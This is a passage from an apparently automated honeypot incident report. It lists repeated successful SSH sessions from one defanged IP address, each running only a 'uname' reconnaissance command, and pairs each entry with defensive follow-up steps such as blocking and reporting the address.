| `2026-08-20 19:28:49` | `cowrie.session.params` |
| `2026-08-20 19:28:49` | `cowrie.command.input` |
| `2026-08-20 19:28:53` | `cowrie.log.closed` |
| `2026-08-20 19:28:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fb4567ebd0d

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:27` | `cowrie.session.connect` |
| `2026-08-20 19:28:27` | `cowrie.client.version` |
| `2026-08-20 19:28:28` | `cowrie.client.kex` |
| `2026-08-20 19:28:42` | `cowrie.login.success` |
| `2026-08-20 19:28:50` | `cowrie.session.params` |
| `2026-08-20 19:28:50` | `cowrie.command.input` |
| `2026-08-20 19:28:53` | `cowrie.log.closed` |
| `2026-08-20 19:28:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97e30f762bca

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:27` | `cowrie.session.connect` |
| `2026-08-20 19:28:27` | `cowrie.client.version` |
| `2026-08-20 19:28:32` | `cowrie.client.kex` |
| `2026-08-20 19:28:48` | `cowrie.login.success` |
| `2026-08-20 19:28:59` | `cowrie.session.params` |
| `2026-08-20 19:28:59` | `cowrie.command.input` |
| `2026-08-20 19:29:00` | `cowrie.log.closed` |
| `2026-08-20 19:29:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e67ad4611db

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:27` | `cowrie.session.connect` |
| `2026-08-20 19:28:27` | `cowrie.client.version` |
| `2026-08-20 19:28:28` | `cowrie.client.kex` |
| `2026-08-20 19:28:42` | `cowrie.login.success` |
| `2026-08-20 19:28:53` | `cowrie.session.params` |
| `2026-08-20 19:28:53` | `cowrie.command.input` |
| `2026-08-20 19:28:54` | `cowrie.log.closed` |
| `2026-08-20 19:28:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4916ddf9b87b

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:27` | `cowrie.session.connect` |
| `2026-08-20 19:28:27` | `cowrie.client.version` |
| `2026-08-20 19:28:28` | `cowrie.client.kex` |
| `2026-08-20 19:28:44` | `cowrie.login.success` |
| `2026-08-20 19:28:50` | `cowrie.session.params` |
| `2026-08-20 19:28:50` | `cowrie.command.input` |
| `2026-08-20 19:28:53` | `cowrie.log.closed` |
| `2026-08-20 19:28:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea3c6434346e

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:27` | `cowrie.session.connect` |
| `2026-08-20 19:28:27` | `cowrie.client.version` |
| `2026-08-20 19:28:32` | `cowrie.client.kex` |
| `2026-08-20 19:28:47` | `cowrie.login.success` |
| `2026-08-20 19:28:52` | `cowrie.session.params` |
| `2026-08-20 19:28:52` | `cowrie.command.input` |
| `2026-08-20 19:28:57` | `cowrie.log.closed` |
| `2026-08-20 19:28:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b7cd2415475

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:27` | `cowrie.session.connect` |
| `2026-08-20 19:28:27` | `cowrie.client.version` |
| `2026-08-20 19:28:27` | `cowrie.client.kex` |
| `2026-08-20 19:28:41` | `cowrie.login.success` |
| `2026-08-20 19:28:55` | `cowrie.session.params` |
| `2026-08-20 19:28:55` | `cowrie.command.input` |
| `2026-08-20 19:28:57` | `cowrie.log.closed` |
| `2026-08-20 19:28:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd5b112a64ec

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 55s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:28` | `cowrie.session.connect` |
| `2026-08-20 19:28:28` | `cowrie.client.version` |
| `2026-08-20 19:28:30` | `cowrie.client.kex` |
| `2026-08-20 19:29:11` | `cowrie.login.success` |
| `2026-08-20 19:29:20` | `cowrie.session.params` |
| `2026-08-20 19:29:20` | `cowrie.command.input` |
| `2026-08-20 19:29:21` | `cowrie.log.closed` |
| `2026-08-20 19:29:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb07cc19be2f

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 42s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:32` | `cowrie.session.connect` |
| `2026-08-20 19:28:32` | `cowrie.client.version` |
| `2026-08-20 19:28:40` | `cowrie.client.kex` |
| `2026-08-20 19:28:55` | `cowrie.login.success` |
| `2026-08-20 19:29:04` | `cowrie.session.params` |
| `2026-08-20 19:29:04` | `cowrie.command.input` |
| `2026-08-20 19:29:10` | `cowrie.log.closed` |
| `2026-08-20 19:29:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a35bdc0f282e

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 58s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:32` | `cowrie.session.connect` |
| `2026-08-20 19:28:32` | `cowrie.client.version` |
| `2026-08-20 19:28:40` | `cowrie.client.kex` |
| `2026-08-20 19:29:15` | `cowrie.login.success` |
| `2026-08-20 19:29:25` | `cowrie.session.params` |
| `2026-08-20 19:29:25` | `cowrie.command.input` |
| `2026-08-20 19:29:30` | `cowrie.log.closed` |
| `2026-08-20 19:29:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eca0607d232c

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 54s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:32` | `cowrie.session.connect` |
| `2026-08-20 19:28:32` | `cowrie.client.version` |
| `2026-08-20 19:28:40` | `cowrie.client.kex` |
| `2026-08-20 19:29:06` | `cowrie.login.success` |
| `2026-08-20 19:29:20` | `cowrie.session.params` |
| `2026-08-20 19:29:20` | `cowrie.command.input` |
| `2026-08-20 19:29:24` | `cowrie.log.closed` |
| `2026-08-20 19:29:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b7396c8bd07

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:32` | `cowrie.session.connect` |
| `2026-08-20 19:28:32` | `cowrie.client.version` |
| `2026-08-20 19:28:37` | `cowrie.client.kex` |
| `2026-08-20 19:28:46` | `cowrie.login.success` |
| `2026-08-20 19:28:51` | `cowrie.session.params` |
| `2026-08-20 19:28:51` | `cowrie.command.input` |
| `2026-08-20 19:28:53` | `cowrie.log.closed` |
| `2026-08-20 19:28:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcdeae829076

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:40` | `cowrie.session.connect` |
| `2026-08-20 19:28:42` | `cowrie.client.version` |
| `2026-08-20 19:28:44` | `cowrie.client.kex` |
| `2026-08-20 19:28:57` | `cowrie.login.success` |
| `2026-08-20 19:29:06` | `cowrie.session.params` |
| `2026-08-20 19:29:06` | `cowrie.command.input` |
| `2026-08-20 19:29:16` | `cowrie.log.closed` |
| `2026-08-20 19:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f8925d918e6

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:42` | `cowrie.session.connect` |
| `2026-08-20 19:28:42` | `cowrie.client.version` |
| `2026-08-20 19:28:44` | `cowrie.client.kex` |
| `2026-08-20 19:28:55` | `cowrie.login.success` |
| `2026-08-20 19:29:11` | `cowrie.session.params` |
| `2026-08-20 19:29:11` | `cowrie.command.input` |
| `2026-08-20 19:29:16` | `cowrie.log.closed` |
| `2026-08-20 19:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c478618fe31

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:42` | `cowrie.session.connect` |
| `2026-08-20 19:28:42` | `cowrie.client.version` |
| `2026-08-20 19:28:46` | `cowrie.client.kex` |
| `2026-08-20 19:28:59` | `cowrie.login.success` |
| `2026-08-20 19:29:04` | `cowrie.session.params` |
| `2026-08-20 19:29:04` | `cowrie.command.input` |
| `2026-08-20 19:29:08` | `cowrie.log.closed` |
| `2026-08-20 19:29:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94847eced9a9

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:42` | `cowrie.session.connect` |
| `2026-08-20 19:28:42` | `cowrie.client.version` |
| `2026-08-20 19:28:46` | `cowrie.client.kex` |
| `2026-08-20 19:28:52` | `cowrie.login.success` |
| `2026-08-20 19:28:55` | `cowrie.session.params` |
| `2026-08-20 19:28:55` | `cowrie.command.input` |
| `2026-08-20 19:28:57` | `cowrie.log.closed` |
| `2026-08-20 19:28:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b2f441f3216

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 51s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:42` | `cowrie.session.connect` |
| `2026-08-20 19:28:42` | `cowrie.client.version` |
| `2026-08-20 19:28:46` | `cowrie.client.kex` |
| `2026-08-20 19:29:21` | `cowrie.login.success` |
| `2026-08-20 19:29:29` | `cowrie.session.params` |
| `2026-08-20 19:29:29` | `cowrie.command.input` |
| `2026-08-20 19:29:32` | `cowrie.log.closed` |
| `2026-08-20 19:29:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aecb913af8c0

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:42` | `cowrie.session.connect` |
| `2026-08-20 19:28:42` | `cowrie.client.version` |
| `2026-08-20 19:28:46` | `cowrie.client.kex` |
| `2026-08-20 19:28:54` | `cowrie.login.success` |
| `2026-08-20 19:29:09` | `cowrie.session.params` |
| `2026-08-20 19:29:09` | `cowrie.command.input` |
| `2026-08-20 19:29:14` | `cowrie.log.closed` |
| `2026-08-20 19:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e7e5e99f846

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:42` | `cowrie.session.connect` |
| `2026-08-20 19:28:42` | `cowrie.client.version` |
| `2026-08-20 19:28:44` | `cowrie.client.kex` |
| `2026-08-20 19:29:00` | `cowrie.login.success` |
| `2026-08-20 19:29:09` | `cowrie.session.params` |
| `2026-08-20 19:29:09` | `cowrie.command.input` |
| `2026-08-20 19:29:14` | `cowrie.log.closed` |
| `2026-08-20 19:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3facaae1321

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:42` | `cowrie.session.connect` |
| `2026-08-20 19:28:42` | `cowrie.client.version` |
| `2026-08-20 19:28:47` | `cowrie.client.kex` |
| `2026-08-20 19:28:54` | `cowrie.login.success` |
| `2026-08-20 19:28:58` | `cowrie.session.params` |
| `2026-08-20 19:28:58` | `cowrie.command.input` |
| `2026-08-20 19:29:00` | `cowrie.log.closed` |
| `2026-08-20 19:29:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95692b82e213

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:42` | `cowrie.session.connect` |
| `2026-08-20 19:28:42` | `cowrie.client.version` |
| `2026-08-20 19:28:47` | `cowrie.client.kex` |
| `2026-08-20 19:28:54` | `cowrie.login.success` |
| `2026-08-20 19:28:59` | `cowrie.session.params` |
| `2026-08-20 19:28:59` | `cowrie.command.input` |
| `2026-08-20 19:29:03` | `cowrie.log.closed` |
| `2026-08-20 19:29:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b6f20415a26

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:42` | `cowrie.session.connect` |
| `2026-08-20 19:28:42` | `cowrie.client.version` |
| `2026-08-20 19:28:47` | `cowrie.client.kex` |
| `2026-08-20 19:28:56` | `cowrie.login.success` |
| `2026-08-20 19:29:05` | `cowrie.session.params` |
| `2026-08-20 19:29:05` | `cowrie.command.input` |
| `2026-08-20 19:29:10` | `cowrie.log.closed` |
| `2026-08-20 19:29:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c76ac35d4e90

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:42` | `cowrie.session.connect` |
| `2026-08-20 19:28:42` | `cowrie.client.version` |
| `2026-08-20 19:28:47` | `cowrie.client.kex` |
| `2026-08-20 19:28:48` | `cowrie.login.success` |
| `2026-08-20 19:28:56` | `cowrie.session.params` |
| `2026-08-20 19:28:56` | `cowrie.command.input` |
| `2026-08-20 19:28:59` | `cowrie.log.closed` |
| `2026-08-20 19:29:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5801fa77b040

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:42` | `cowrie.session.connect` |
| `2026-08-20 19:28:43` | `cowrie.client.version` |
| `2026-08-20 19:28:46` | `cowrie.client.kex` |
| `2026-08-20 19:28:52` | `cowrie.login.success` |
| `2026-08-20 19:28:57` | `cowrie.session.params` |
| `2026-08-20 19:28:57` | `cowrie.command.input` |
| `2026-08-20 19:28:59` | `cowrie.log.closed` |
| `2026-08-20 19:29:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a096b01c2b7

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:42` | `cowrie.session.connect` |
| `2026-08-20 19:28:43` | `cowrie.client.version` |
| `2026-08-20 19:28:44` | `cowrie.client.kex` |
| `2026-08-20 19:28:59` | `cowrie.login.success` |
| `2026-08-20 19:29:10` | `cowrie.session.params` |
| `2026-08-20 19:29:10` | `cowrie.command.input` |
| `2026-08-20 19:29:14` | `cowrie.log.closed` |
| `2026-08-20 19:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fe85c38af2d

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:42` | `cowrie.session.connect` |
| `2026-08-20 19:28:43` | `cowrie.client.version` |
| `2026-08-20 19:28:47` | `cowrie.client.kex` |
| `2026-08-20 19:28:56` | `cowrie.login.success` |
| `2026-08-20 19:29:01` | `cowrie.session.params` |
| `2026-08-20 19:29:01` | `cowrie.command.input` |
| `2026-08-20 19:29:05` | `cowrie.log.closed` |
| `2026-08-20 19:29:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c860d52aea3f

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
